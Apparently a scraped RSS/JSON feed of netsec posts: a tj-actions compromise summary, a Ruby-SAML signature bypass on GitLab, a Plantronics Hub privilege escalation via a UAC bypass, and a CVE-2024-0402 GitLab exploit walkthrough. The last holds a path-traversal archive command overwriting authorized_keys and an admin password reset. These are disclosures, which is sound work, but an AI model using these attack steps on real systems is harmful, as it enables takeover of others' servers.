include:</p><ul><li>GitHub personal access tokens</li></ul><p>It is worth noting that, at the time of testing, only 1% of the leaked secrets could be verified as valid. This, along with the amount of cleared log files, indicates that the remediation steps were considered important and performed on time.</p><p>The compromise of the  GitHub Action is a perfect example of how attackers use secrets to gain further access after exploiting an initial vulnerability, achieving lateral movement that is difficult to detect.</p><p>Following our investigations, we highly recommend inspecting your GitHub actions to find out if you are affected.</p><p>From a detection standpoint, this research underscores the need to use <a href=\"https://www.gitguardian.com/honeytoken?ref=blog.gitguardian.com\"></a> for early warning, as breaches are ultimately inevitable and can go unnoticed when the corresponding attacks are properly executed.</p>","contentLength":5257,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jec56b/compromised_tjactionschangedfiles_github_action_a/"},{"title":"SAML roulette: the hacker always wins","url":"https://portswigger.net/research/saml-roulette-the-hacker-always-wins","date":1742313695,"author":"/u/albinowax","guid":3255,"unread":true,"content":"<ul><li><p>18 March 2025 at 14:55 UTC</p></li><li><p>18 March 2025 at 15:17 UTC</p></li></ul><img src=\"https://portswigger.net/cms/images/89/2e/02d7-article-blog_header.png\" alt=\"Multiple XML documents with arrows pointing in a circle to represent a round-trip attack\"><p><b>In this post, we’ll show precisely how to chain round-trip attacks and namespace confusion to achieve unauthenticated admin access on GitLab Enterprise by exploiting the ruby-saml library.</b></p><p>While researching this, GitHub independently discovered and patched our vulnerabilities. However, their disclosure omits key technical details, including the specific mutation and how to exploit it without authentication.\n</p><p>We believe sharing the full details on how these attacks work is crucial for improving security by empowering everyone with the knowledge needed to identify, mitigate, and defend against such threats effectively.\n</p><p>This research began after we came across a fascinating post by <a href=\"https://mattermost.com/blog/securing-xml-implementations-across-the-web/\">Juho Forsén\n</a> detailing an XML round-trip vulnerability. What started as curiosity quickly spiraled into a deep dive into the intricacies of SAML, uncovering far more than we initially expected. We spent months exploring various round-trip attacks with the goal of presenting our findings at Black Hat. However, as luck would have it, we ran into a research collision with Alexander Tan (\n<a href=\"https://hackerone.com/ahacker1/\">ahacker1\n</a>), leading to our discoveries being patched before we could submit. Despite that twist, we believe this work is still worth sharing, and while it may not be hitting Black Hat this year, we hope you find it just as compelling.</p><p>SAML libraries often parse an XML document, store it as a string, and later re-parse it. In Ruby-SAML, this process involves two different parsers: REXML, which is used to parse the document and validate the signature, and Nokogiri, which is used to access attributes. If any mutations occur during this process, the document may not be identical when parsed a second time.</p><p>\nFor secure authorization, the document must be parsed and serialized consistently; otherwise, structural inconsistencies may arise. These inconsistencies can be exploited in a round-trip attack. By leveraging XML comments and CDATA sections, an attacker can manipulate the document’s structure during mutation, bypassing signature verification and effectively gaining unauthorized access by assuming another user's identity.\n</p><h2>Round-trip attack on Ruby SAML/REXML</h2><p>To facilitate testing, we developed a testbed to identify round-trip vulnerabilities and efficiently evaluate multiple SAML libraries. I began by examining the document type definition (DOCTYPE), as similar vulnerabilities had been discovered in the past. My initial approach focused on analyzing how <a href=\"https://portswigger.net/web-security/xxe/xml-entities\">XML entities</a> were parsed, so I conducted tests in that area.</p><p>\nIn Juho's original discovery, notation declarations were used to introduce inconsistencies in how quotes were interpreted. Building on this, I investigated whether any additional vulnerabilities had been overlooked. After extensive testing, I found that mutations could be introduced within the SYSTEM identifier.\n</p><p>\n\nDuring the initial parsing of the document, the first tag encountered is the original \"assertion\":\n\n</p><img src=\"https://portswigger.net/cms/images/c1/ea/4da4-article-image1.png\" alt=\"Code snippet showing the mutation initial discovery, the first time it's parsed\"><p>However, upon re-parsing the document, the outcome changes entirely, now reflecting the attacker's \"assertion\":</p><img src=\"https://portswigger.net/cms/images/b6/13/6783-article-image2.png\" alt=\"A code snippet showing the second time it's parsed\"><p>As shown, the single-quoted system identifier is converted to double quotes. However, since the identifier contains double quotes internally, this alters the XML document’s syntax, causing the XML comment to be processed and resulting in an entirely different node. My highly skilled colleague, <a href=\"https://x.com/d4d89704243\">Zak</a>, refined this mutation into a more streamlined and effective attack vector:\n</p><img src=\"https://portswigger.net/cms/images/94/96/8d11-article-image3.png\" alt=\"A more elegant vector\"><p>This vector allowed exploitation of GitLab and any other application using the Ruby-SAML library by manipulating the document and forging assertions, effectively enabling an attacker to log in as any user. However, this was only part of the attack. My colleague  will demonstrate how this can be escalated to achieve <b>unauthenticated administrator access</b> on </p><h2>Privilege escalation at Gitlab via Round-trip attack</h2><h3>Understanding the vulnerability</h3><p>GitLab relies on the Ruby-SAML library for SAML authentication. However, to achieve unauthenticated access, we need to take a closer look at the validation process, as it plays a critical role in the attack.</p><p>\nBefore a  occurs, the library verifies whether the SAMLResponse contains a valid certificate embedded in the document. This is done by computing the hash of the certificate and comparing it with the fingerprint stored on the server. Later, this certificate is used to validate the signature. Keep in mind that the signature is a key aspect of this attack, as it allows for a  without access to an organization's credentials.\n</p><h3>The Signature Validation Process</h3><p>Once the certificate is extracted from the SAMLResponse, the actual signature validation process begins. First, the document is converted back to XML format from its in-memory representation. This is where <b>Gareth's round trip attack</b> comes into play. At this stage, the library ignores  and proceeds to validate the signature on the  element.</p><p>\nIf an attacker forges the assertion element in a way that bypasses signature validation, additional security checks come into play. The most critical checks include:\n</p><ol><li>The&nbsp;&nbsp;should match in both documents.</li><li>Canonicalization properties (which normalize XML documents) must be identical in both versions.</li></ol><p>However, all other validation checks operate on the attacker assertion rather than the original signed document. This allows an attacker to arbitrarily modify validation fields without breaking the signature verification process:</p><img src=\"https://portswigger.net/cms/images/6e/6d/6913-article-image4.png\" alt=\"A code snippet showing where each assertion goes\"><h2>Overcoming XML Schema Restrictions</h2><p>One challenge in forging a signed XML document is that XML schema validation is performed using Nokogiri with predefined schema files. This presents a limitation: for an attacker to forge a valid signed XML document, they must first obtain a document that passes XML schema validation.</p><h3>Understanding XML Schema Validation</h3><p>An XML schema defines the structure of SAML XML documents, specifying:</p><ul><li>Valid elements and attributes</li><li>The order and number of child elements</li><li>Data types for elements and attributes</li></ul><p>\n\nIn other words, the signed element must be a valid SAML protocol element—such as a login response, logout response, or metadata. You might find signed XML documents on developer forums, but that scenario is unlikely. Therefore, we will take a different approach. Instead, we introduce the  attack, which enables unauthenticated access to any application using Ruby-SAML.\n\n</p><h2>Unauthenticated access to Gitlab</h2><p>Before diving into the attack, let's recall how SAML schema validation works. The Identity Provider (IdP) signs only the Signature node, not the entire assertion.\n\nSince Ruby-SAML uses two XML parsers:</p><ul><li>REXML reads the Signature element.</li><li>Nokogiri reads the DigestValue.</li></ul><p>A discrepancy between these two parsers can allow us to bypass signature validation.\n\nRuby-SAML searches for the Signature element using an XPath query:\n\n</p><img src=\"https://portswigger.net/cms/images/bc/8c/7933-article-image5.png\" alt=\"Showing the XPath query\"><p>Here,  refers to the XML namespace. Normally, namespaces prevent element name conflicts, but we exploit a discrepancy in how namespaces are interpreted in XPath searches.\nConsider the following scenario:\n\n</p><img src=\"https://portswigger.net/cms/images/09/e1/815d-article-image6.png\" alt=\"Showing the namespace confusion attack\"><p>First Signature element lacks a direct namespace declaration (xmlns=\"http://www.w3.org/2000/09/xmldsig#\"). Instead, we use an XML Doctype trick:\n\nSecurity experts often focus on !ENTITY declarations in <a href=\"https://portswigger.net/web-security/xxe\">XXE</a> attacks, but !ATTLIST declarations can also be used for exploitation. The !ATTLIST defines the Signature element and assigns it a namespace attribute. Both REXML and Nokogiri support doctype-based namespace declarations, but REXML has a crucial flaw:\n\n</p><ul><li>XML standards prohibit duplicate attributes with the same name.</li><li>However, REXML ignores this restriction in doctype declarations.</li></ul><p>This allows an attacker to define two conflicting namespace attributes, where the second one overrides the first.\n\nAs a result, REXML reads a FAKE digest value, while Nokogiri reads the REAL one.\n\n</p><p>To exploit this discrepancy:</p><ul><li>Create two Signature elements:\n<ul><li>One with a valid Digest value.</li></ul></li></ul><p>\n\nThis allows the attacker to bypass Ruby-SAML's Digest Validation process.\n\n</p><h2>\nExploiting Ruby &lt; 3.4.2 by combining Namespace Confusion with Round-trip attack\n</h2><p>While Namespace Confusion alone can exploit Ruby-SAML, it faces one limitation:\n\nREXML's poor handling of XML marshalling/unmarshalling introduces another round trip issue. Before Ruby 3.4.2, REXML truncated !ATTLIST strings in doctype declarations, making the exploit fragile. In GitLab, this breaks the attack, but a combination of both vulnerabilities can still be used:\n\n</p><img src=\"https://portswigger.net/cms/images/b0/33/c00c-article-image7.png\" alt=\"Combining namespace confusion with the round-trip attack\"><p>First XML parsing: REXML initially ignores the !ATTLIST value, treating it as a string literal. Second XML parsing: REXML then recognizes the !ATTLIST declaration, leading to full exploitation.</p><h3>Leveraging WS-Federation to Obtain Signed XML</h3><p>Federation metadata documents are publicly accessible to any unauthorized user—all that’s required is the application's unique ID, which can be easily extracted from the Identity Provider's URL or found using a search engine.</p><p>While this metadata is not a valid SAML metadata document, a  attack only requires a valid Signature element—one that is signed with the same certificate stored at the Service Provider. And it is.</p><p>By using this publicly available signed document, an attacker can:\n</p><ul><li>Extract a legitimate Signature element.</li><li>Forge a fake signed assertion.</li><li>Completely bypass GitLab SAML authentication.</li></ul><p>\n\nThis attack highlights how combining round-trip attacks with namespace confusion can lead to unauthenticated access to GitLab. The vulnerability stems from inconsistencies in how different XML parsers handle document validation, allowing an attacker to manipulate signature verification.\n\n</p><ul><li>Differences in XML parsing can introduce exploitable inconsistencies.</li><li>Namespace confusion can be leveraged to bypass signature validation.</li><li>Legitimate signed WS-Federation metadata XML can be repurposed to forge assertions.</li></ul><p>To prevent this type of attack, ensure that the same library is used for both parsing and validating signed XML documents. Avoid marshaling and unmarshaling untrusted user data. These vulnerabilities where fixed in versions 17.9.2, 17.8.5, 17.7.7 for GitLab Community Edition (CE) and Enterprise Edition (EE). </p>","contentLength":10074,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1je8f1h/saml_roulette_the_hacker_always_wins/"},{"title":"Local Privilege Escalation via Unquoted Search Path in Plantronics Hub","url":"https://www.8com.de/cyber-security-blog/local-privilege-escalation-via-unquoted-search-path-in-plantronics-hub","date":1742308852,"author":"/u/k8pf","guid":3233,"unread":true,"content":"<p>This blog post describes an unquoted search path vulnerability and its exploitation in the Plantronics Hub software. This client software is used to configure Plantronics audio devices such as headsets. Plantronics Hub is therefore often additionally installed by VoIP or SIP software solutions to ensure compatibility between the headset and the telephony software.</p><p>The blog post specifically addresses the vulnerability in combination with the 'OpenScape Fusion for MS Office' software as it also installs the Plantronics Hub as a dependency. OpenScape Fusion for MSOffice is a software solution that integrates unified communications features directly into Microsoft Outlook. OpenScape Fusion enables users to access their unified communications features (such as voice over IP, video calling, instant messaging and presence status) directly from Microsoft Office applications.</p><p>The blog post describes how an unquoted search path vulnerability in the Plantronics Hub could result in OpenScape being used to execute arbitrary files under C:\\, if incorrect permissions are assigned to that path. This attack also escalates privileges to the local administrator if an administrator starts the OpenScape application.</p><p>The vulnerability was found in Plantronics Hub version 3.24.5 and is still present in the latest version 3.25.2. Although this software is no longer officially supported and should not be used, we have found it installed on client laptops in combination with the equally obsolete OpenScape Fusion for MS Office software. HP&nbsp;updated their End of Commercial Sale Notice to inform customers.</p><p>The following prerequisites were necessary to successfully exploit the vulnerability on Windows 10.</p><ul role=\"list\"><li>OpenScape Fusion for MS Office V2R1.33.0 (Build 104)</li><li>Users were also allowed to create files directly in C:\\</li></ul><p>A security scan of a customer's laptop revealed that the OpenScape for MS Office software was installed with the Plantronics Hub software. A registry entry was found which ensures that OpenScape Fusion is automatically launched when a user logs in.</p><p>When analyzing the OpenScape Fusion startup process using ProcessMonitor, an unquoted path vulnerability has been detected. The application tries to start another application named PLTHub.exe via the path C:\\Program Files (x86)\\Plantronics\\Spokes3G SDK\\PLTHub.exe, which is stored as an extension in a registry entry. This registry entry is called LocalServer32 and is initially created without quotation marks during the installation of the Plantronics Hub application (PLTHub.exe). This is a specific registry key that is used to specify the full path to a local 32-bit server application. The OpenScape software uses this key as the path to the Plantronics HubServer software.</p><p>If you do not use quotation marks for file paths, Windows interprets the path as a file path up to the first space, followed by parameters. For example, the path C:\\Program Files (x86)\\Plantronics\\Spokes3G SDK\\PLTHub.exe, where the first space is immediately followed by C:\\Program, the program will first search for an executable file C:\\Program.exe. Everything after C:\\Program is used as a parameter. Only if C:\\Program.exe is not found, the execution of the file under the full path C:\\Program Files (x86)\\Plantronics\\Spokes3G SDK\\PLTHub.exe will be attempted.</p><p>As the system has been configured so that all users can write in C:\\, it is possible that a local authenticated attacker could execute arbitrary files through other users. It is also possible to execute commands in the context of an administrative user, if an administrator is logged on to the system locally. As the OpenScape software is configured as a startup application, it should also automatically attempt to run the Plantronics Hub software when an administrator logs in. As a result, we can run commands as an administrator and therefore escalate our privileges.</p><p>In ProcessMonitor, the event with the executed path looks like this:</p><p>To execute programs as an administrator, a UAC (User Account Control) bypass is necessary. UAC is a Windows feature that prevents unprivileged processes to elevate their privileges without consent. If a user wants to run the process in an elevated mode, UAC displays a dialogue box to confirm that the process is allowed to run with elevated privileges.</p><p>To bypass this feature, we will use the UAC-Bypass called akagi from hfiref0x’s Github-Repository <a href=\"https://github.com/hfiref0x/UACME\">UACme</a>.</p><p>A total of three files in the C:\\ root directory were required to exploit the vulnerability:</p><ul role=\"list\"><li>Program.exe (Entry point)</li></ul><p>We will go through the required files one by one in order to achieve successful execution.</p><p>Program.exe is a small self-written compiled C++ program that calls the UAC bypass aka.exe (akagi64). Astute readers may wonder why aka.exe is not renamed directly to Program.exe. This is because additional parameters need to be passed to the UAC bypass. However, as OpenScape only looks for the Plantronic Hub path and we have no control over other parameters, this is not possible. Therefore, the Program.exe is used to perform this redirection with parameters. In this case, Program.exe executes the following command:</p><pre contenteditable=\"false\"><code></code></pre><p>aka.exe implements the UAC bypass and should be executed via Program.exe as described above as soon as another user logs in. Then OpenScape should open automatically and attempt to start the Plantronics Hub software. The number 41 in the command describes the method used (Type: Elevated COM interface, Method: ICMLuaUtil) to perform the UAC bypass on Windows. This is followed by the programm to run with administrative rights.</p><p>In this case it is ape.exe.lnk, which is a shortcut to Powershell.exe. To specify other payloads, the code to be executed can simply be specified in the shortcut under „Target“. In this case, the following command was used for demonstration purposes to write the current user's permissions to a file:</p><pre contenteditable=\"false\"><code></code></pre><p>Once the three files have been placed in the C:\\ directory on the system, the vulnerability is triggered the next time a user logs on to the system. In this case, an administrative logs on to the system. After the automatic start of OpenScape Fusion, ProcessMonitor confirmed that the file C:\\Program.exe was searched for and found.</p><p>A new process was then started to run the executable. ProcessMonitor also shows that the path is not in quotes, so the target path ends after the first space, resulting in the path „C:\\Program.exe“.</p><p>Since Program.exe simply runs „C:\\aka.exe 41 C:\\ape.exe.lnk“, the execution of the UAC bypass aka.exe will be visible in the next step.</p><p>The Program.exe payload can also be seen in the command line section of the now-running aka.exe, which should initiate the UAC bypass to run the Powershell shortcut with the configured payload.</p><p>If the UAC bypass is successful, a Powershell window with administrative privileges will appear for a short time. The UAC bypass will now run the Powershell shortcut called ape.exe.lnk with the configured parameters as payload.</p><p>The process monitor also provides information that the payload has been successfully executed. The integrity of the process is set to a high commitment level. You can also view the FileWrite operations. These write the output of the whoami command to C:\\poc.txt.</p><p>The poc.txt has been created in the C:\\ directory after execution.</p><p>The contents of the file show that we were able to get a logged on administrator to run our payload with his privileges. The file shows that the user is in the administrators group. This allowed us to successfully execute code in the context of an administrator using the Unquoted Search Parameter vulnerability in the Plantronics Hub via the OpenScape application configured for startup.</p><p>Note that applications often install other applications as dependencies and the paths to these applications may have been stored as unquoted registry keys. As you can see from this blog post, in real-world environments this can lead to privilege escalations. Even if the software itself cannot trigger this vulnerability, another piece of software might - in this case by accessing the LocalServer32 registry key to get the path to the local server application.</p><p>As there are several similar vulnerabilities in the world like this one, there is already a CWE for it:</p><div><p><i><a href=\"https://cwe.mitre.org/data/definitions/428.html\">CWE-428: Unquoted Search Path or Element</a>The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path. If a malicious individual has access to the filesystem, it is possible to elevate privileges by inserting such a file as \"C:\\Program.exe\" to be run by a privileged program making use of WinExec.</i></p></div><p>Unfortunately, an update to address the Plantronics Hub vulnerability is not available as the software is no longer supported. The following steps are recommended to mitigate the vulnerability and reduce the exploitation of such vulnerabilities in general:</p><h4>Measure 1: Quote the registry entry</h4><p>To fully fix the vulnerability on the OpenScape Fusion and PlantronicsHub side the registry entry with the path to PLTHub.exe must be enclosed by quotation marks.</p><p>For this, wrap the string entry named „(Default)“ under <em>„HKEY_CLASSES_ROOT\\WOW6432Node\\CLSID\\{750B4A16-1338-4DB0-85BB-C6C89E4CB9AC}\\LocalServer32“</em> with quotation marks.</p><p>The entry should look like this:</p><pre contenteditable=\"false\"><code></code></pre><p>In newer versions the software is installed to C:\\Program Files(x86)\\Plantronics\\Spokes3GSDK\\PLTHub.exe instead of C:\\Program Files(x86)\\Plantronics\\Spokes3G SDK\\PLTHub.exe (no space in the Spokes 3Gfolder).</p><p>So the following path must therefore be enclosed in quotation marks:</p><pre contenteditable=\"false\"><code></code></pre><h4>Measure 2: Restrict permissions for C:\\</h4><p>Ensure that only administrators and system accounts can write files to the C:\\ root directory, as is the default. Write permissions to the C:\\directory for non-privileged accounts should be removed.</p><p>13.01.2025 - Contacted HP&nbsp;PSRT and received immediate response, sharing of PoC13.01.2025 - HP&nbsp;responded with End of Life of Plantronics Hub<p>14.01.2025 - Asked for notice to customers due to usage</p>04.02.2025 - HP&nbsp;PSRT&nbsp;responded and updated&nbsp;<a href=\"https://support.hp.com/hk-en/document/ish_9734261-9734121-16\">End of Commercial Sale Notice </a>05.02.2025 - 8com adjusted disclosure timeline due to no fix<p>03.03.2025 - 8com provided a draft for this blog post</p>12.03.2025 - HP&nbsp;approves this blog post<p>14.03.2025 - Date of disclosure</p></p><p>Image (c) Header Image AI&nbsp;generated with Midjourney</p>","contentLength":10338,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1je6j64/local_privilege_escalation_via_unquoted_search/"},{"title":"CEF Debugger Enabled in Google Web Designer | Google Bug Hunters","url":"https://bughunters.google.com/reports/vrp/qMhY4nw9i","date":1742304136,"author":"/u/smaury","guid":3213,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1je4tfc/cef_debugger_enabled_in_google_web_designer/"},{"title":"Arbitrary File Write CVE-2024-0402 in GitLab (Exploit)","url":"https://blog.doyensec.com/2025/03/18/exploitable-gitlab.html","date":1742303296,"author":"/u/nibblesec","guid":3215,"unread":true,"content":"<p>I know, we have written it <a href=\"https://blog.doyensec.com/2025/02/11/exploitable-iot.html\">multiple</a><a href=\"https://blog.doyensec.com/2025/02/27/exploitable-sshd.html\">times</a> now, but in case you are just tuning in, Doyensec had found themselves on a cruise ship touring the Mediterranean for our company retreat. To kill time between parties, we had some hacking sessions analyzing real-world vulnerabilities resulting in the  blogpost series.</p><p>In <a href=\"https://blog.doyensec.com/2025/02/11/exploitable-iot.html\" target=\"_blank\">Part 1</a> we covered our journey into IoT ARM exploitation, while <a href=\"https://blog.doyensec.com/2025/02/27/exploitable-sshd.html\" target=\"_blank\">Part 2</a> followed our attempts to exploit the bug used by Trinity in  movie.</p><p>For this episode, we will dive into the exploitation of <a href=\"https://nvd.nist.gov/vuln/detail/cve-2024-0402\">CVE-2024-0402</a> in GitLab. Like an onion, there is always another layer beneath the surface of this bug, from YAML parser differentials to path traversal in decompression functions in order to achieve arbitrary file write in GitLab.</p><p>No public Proof Of Concept was published and making it turned out to be an adventure, deserving an extension of the original author’s <a href=\"https://gitlab-com.gitlab.io/gl-security/security-tech-notes/security-research-tech-notes/devfile/\" target=\"_blank\">blogpost</a> with the PoC-related info to close the circle 😉</p><p>This vulnerability impacts the GitLab  functionality. To make a long story short, it lets developers instantly spin up integrated development environments (IDE) with all dependencies, tools, and configurations ready to go.</p><p>The whole Workspaces functionality relies on several components, including a running  and a devfile configuration.</p><p> The Kubernetes GitLab Agent connects GitLab to a Kubernetes cluster, allowing users to enable deployment process automations and making it easier to integrate GitLab CI/CD pipelines. <em>It also allows Workspaces creation</em>.</p><p> It is an <a href=\"https://devfile.io/docs/2.3.0/what-is-a-devfile\" target=\"_blank\">open standard</a> defining containerized development environments. Let’s start by saying it is configured with YAML files used to define the tools, runtime, and dependencies needed for a certain project.</p><p>Example of a devfile configuration (to be placed in the GitLab repository as ):</p><div><div><pre><code></code></pre></div></div><p>Let’s start with the publicly available information enriched with extra code-context.</p><p>GitLab was using the  Gem ( of course) making calls to the external  binary (written in Go) in order to process the  files during Workspace creation in a specific repository.</p><p>During the devfile pre-processing routine applied by Workspaces, a specific validator named  was called by <code>PreFlattenDevfileValidator</code> in GitLab.</p><div><div><pre><code></code></pre></div></div><blockquote><p>If you designate a parent devfile, the given devfile inherits all its behavior from its parent. Still, you can use the child devfile to override certain content from the parent devfile.</p></blockquote><p>Then, it proceeds to describe three types of  references:</p><ul><li><em>Parent referred by registry</em> - remote devfile registry</li><li> - static HTTP server</li><li><em>Parent identified by a Kubernetes resource</em> - available namespace</li></ul><p>As with any other remote fetching functionality, it would be worth reviewing to find bugs. But at first glance the option seems to be blocked by .</p><h4>YAML parser differentials for the win</h4><p>As widely known, even the most used implementations of specific standards may have minor deviations from what was defined in the specification. In this specific case, a YAML parser differential between Ruby and Go was needed.</p><p>The author blessed us with a new trick for our differentials notes. In the YAML Spec:</p><ul><li>The single exclamation mark  is used for custom or application-specific data types\n    <div><div><pre><code></code></pre></div></div></li><li>The double exclamation mark  is used for built-in YAML types\n    </li></ul><p>He found out that the local YAML tags notation  (<a href=\"https://yaml.org/spec/1.2.2/#3212-tags\" target=\"_blank\">RFC reference</a>) is still activating the  format  decoding in the Ruby  lib, while the Go  is just dropping it, leading to the following behavior:</p><div><div><pre><code>➜ test3.yaml\nnormalk: just a value\nbinary parent: got injected\n\n\n➜ go run g.go test3.yaml\nparent: got injected\nnormalk: just a value\n\n\n➜ ruby , </code></pre></div></div><p>Consequently, it was possible to pass GitLab a devfile with a  option through  function and reach the  binary execution with it.</p><p>At this point, we need to switch to a bug discovered in the  binary (Go implementation).\nAfter looking into a dependency of a dependency of a dependency, the hunter got his hands on the  function. This was taking  archives from the registry’s library and extracting the files inside the GitLab server.  Later, it should then move them into the deployed Workspace environment.</p><div><div><pre><code></code></pre></div></div><p>The function opens  and iterates through its contents with . Only contents of type  and  are processed, preventing symlink and other nested exploitations.</p><p>Nevertheless, the line <code>target := path.Join(targetDir, filepath.Clean(header.Name))</code> is vulnerable to path traversal for the following reasons:</p><ul><li> comes from a remote  archive served by the devfile registry</li><li> is known for not preventing path traversals on relative paths ( is not removed)</li></ul><p>The resulting execution will be something like:</p><div><div><pre><code></code></pre></div></div><p>There are plenty of scripts to create a valid PoC for an evil archive exploiting such directory traversal pattern (e.g., <a href=\"https://github.com/ptoomey3/evilarc\" target=\"_blank\">evilarc.py</a>).</p><ol><li>A decompression issue in the  lib fetching files from a remote registry allowed a devfile registry containing a malicious  archive to write arbitrary files within the devfile client system</li><li>In GitLab, a developer could craft a  definition including the  option that will force the GitLab server to use the malicious registry, hence triggering the arbitrary file write on the server itself</li></ol><p><strong>The requirements to exploit this vuln are</strong>:</p><ul><li>Access to the targeted GitLab as a  capable of committing code to a repository</li><li>Workspace functionality configured properly on the GitLab instance ( and below)</li></ul><h5>Configuring the environment</h5><p>To ensure you have the full picture, I must tell you what it’s like to configure Workspaces in GitLab, with slow internet while being on a cruise 🌊 - an absolute nightmare!</p><p>Of course, there are the docs on how to do so, but today you will be blessed with some extra finds:</p><ul><li>Follow the  documentation <a href=\"https://archives.docs.gitlab.com/16.8/ee/user/workspace/configuration.html\" target=\"_blank\">page</a>, NOT the latest one since it changed. Do not be like us, wasting fun time in the middle of the sea.</li><li>The feature changed so much, they even removed the container images required by GitLab . So, you need to patch the missing  container image.\n    <div><div><pre><code>ubuntu@gitlabServer16.8:~find /  2&gt;/dev/null\n/opt/gitlab/embedded/service/gitlab-rails/ee/lib/remote_development/workspaces/create/editor_component_injector.rb\n</code></pre></div></div><p>Replace the value at line 129 of the  image with:\n<code>registry.gitlab.com/gitlab-org/gitlab-web-ide-vscode-fork/gitlab-vscode-build:latest</code></p></li><li>The GitLab Agent must have the  option to allow Workspaces.\nHere is a valid  file for it\n    <div><div><pre><code></code></pre></div></div></li></ul><p>May the force be with you while configuring it.</p><p>As previously stated, this bug chain is layered like an onion. Here is a classic 2025 AI generated image sketching it for us:</p><p>The publicly available information left us with the following tasks if we wanted to exploit it:</p><ol><li>Deploy a custom devfile registry, which turned out to be easy following the original <a href=\"https://github.com/devfile/registry\" target=\"_blank\">repository</a></li><li>Make it  by including the  file packed with our path traversal to overwrite something in the GitLab instance</li><li>Add a  pointing to it in a target GitLab repository</li></ol><p>In order to find out where the  belonged, we had to take a step back and read some more code. \nIn particular, we had to understand the context in which the vulnerable  function was being called.</p><p>We ended up reading <code>PullStackByMediaTypesFromRegistry</code>, a function used to pull a specified stack with allowed media types from a given registry URL to some destination directory.</p><div><div><pre><code></code></pre></div></div><p>The code pattern highlighted that  were involved and that they included some  file in their structure.</p><p><strong>Why should a devfile stack contain a tar?</strong></p><blockquote><p>An archive.tar file may be included in the package to distribute starter projects or pre-configured application templates. It helps developers quickly set up their workspace with example code, configurations, and dependencies.</p></blockquote><p>A few quick GitHub searches in the devfile registry building process revealed that our target  file should be placed within the registry project under <code>stacks/&lt;STACK_NAME&gt;/&lt;STACK_VERSION&gt;/archive.tar</code> in the same directory containing the  for the specific version being deployed.</p><p>As a result, the destination for the path-traversal  in our custom registry is:</p><div><div><pre><code>malicious-registry/stacks/nodejs/2.2.1/archive.tar\n</code></pre></div></div><h4>Building &amp; running the malicious devfile registry</h4><p>It required some extra work to build our custom registry (couldn’t make the building scripts work, had to edit them), but we eventually managed to place our  (e.g., created using <a href=\"https://github.com/ptoomey3/evilarc\" target=\"_blank\">evilarc.py</a>) in the right spot and craft a proper  to serve it. The final reusable structure can be found in our <a href=\"https://github.com/doyensec/malicious-devfile-registry\">PoC repository</a>, so save yourself some time to build the devfile registry image.</p><p>Commands to run the malicious registry:</p><ul><li><code>docker run -d -p 5000:5000 --name local-registrypoc registry:2</code> to serve a local container registry that will be used by the devfile registry to store the actual stack (see  highlight)</li><li><code>docker run --network host devfile-index</code> to run the malicious devfile registry built with the official <a href=\"https://github.com/devfile/registry\" target=\"_blank\">repository</a>. Find it in our PoC repository</li></ul><p>Once you have a running registry reachable by the target GitLab instance, you just have to authenticate in GitLab as developer and edit the  of a repository to point it by exploiting the  shown before. Here is an example you can use:</p><div><div><pre><code></code></pre></div></div><p>To trigger the file-write, just start a new Workspace in the edited repo and wait.</p><p>Nice! We have successfully written  in <code>/tmp/plsWorkItsPartyTime.txt</code>.</p><p>We got the write, but we couldn’t stop there, so we investigated some reliable ways to escalate it.\nFirst things first, we checked the system user performing the file write using a session on the GitLab server.</p><div><div><pre><code>/tmp /tmp/plsWorkItsPartyTime.txt\n 1 git git 21 Mar 10 15:13 /tmp/plsWorkItsPartyTime.txt\n</code></pre></div></div><p>Apparently, our go-to user is , a pretty important user in the GitLab internals.\nAfter inspecting writeable files for a quick win, we found out it seemed hardened without tons of editable config files, as expected.</p><div><div><pre><code>...\n/var/opt/gitlab/gitlab-exporter/gitlab-exporter.yml\n/var/opt/gitlab/.gitconfig\n/var/opt/gitlab/.ssh/authorized_keys\n/opt/gitlab/embedded/service/gitlab-rails/db/main_clusterwide.sql\n/opt/gitlab/embedded/service/gitlab-rails/db/ci_structure.sql\n/var/opt/gitlab/git-data/repositories/.gitaly-metadata\n...\n</code></pre></div></div><p>Some interesting files were waiting to be overwritten, but you may have noticed the quickest yet not honorable entry: <code>/var/opt/gitlab/.ssh/authorized_keys</code>.</p><p>Notably, you can <a href=\"https://docs.gitlab.com/user/ssh/#add-an-ssh-key-to-your-gitlab-account\" target=\"_blank\">add an SSH key to your GitLab account</a> and then use it to SSH as  to perform code-related operations. The  file is managed by the GitLab Shell, which adds the SSH Keys from the user profile and forces them into a restricted shell to further manage/restrict the user access-level.</p><p>Here is an example line added to the authorized keys when you add your profile SSH key in GitLab:</p><div><div><pre><code>,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-ed25519 AAAAC3...[REDACTED]\n</code></pre></div></div><p>Since we got arbitrary file write, we can just substitute the  with one containing a non-restricted key we can use. Back to our exploit prepping, create a new  ad-hoc for it:</p><div><div><pre><code>\n➜ python3 evilarc.py authorized_keys  archive.tar.gz  var/opt/gitlab/.ssh/  unix\n</code></pre></div></div><p>At this point, substitute the  in your malicious devfile registry, rebuild its image and run it. When ready, trigger the exploit again by creating a new Workspace in the GitLab Web UI.</p><p>After a few seconds, you should be able to SSH as an unrestricted  user.\nBelow we also show how to change the GitLab Web  user’s password:</p><div><div><pre><code>➜ ssh   ~/.ssh/gitlab2 git@gitinstance.local\n➜ git@gitinstance.local:~gitlab-rails console  production\n\n Ruby:         ruby 3.1.4p223 2023-03-30 revision 957bb7cb81x86_64-linux]\n GitLab:       16.8.0-ee 1e912d57d5a EE\n GitLab Shell: 14.32.0\n PostgreSQL:   14.9\n booted 39.28s \n\nLoading production environment Rails 7.0.8\nirbmain:002:0&gt; user  User.find_by_username \nirbmain:003:0&gt; new_password \nirbmain:004:0&gt; user.password  new_password\n\nirbmain:005:0&gt; user.password_confirmation  new_password\n\nirbmain:006:0&gt; user.password_automatically_set irbmain:007:0&gt; user.save!\n</code></pre></div></div><p>Finally, you are ready to authenticate as the  user in the target Web instance.</p><p>Our goal was to build a <a href=\"https://github.com/doyensec/malicious-devfile-registry\" target=\"_blank\">PoC for 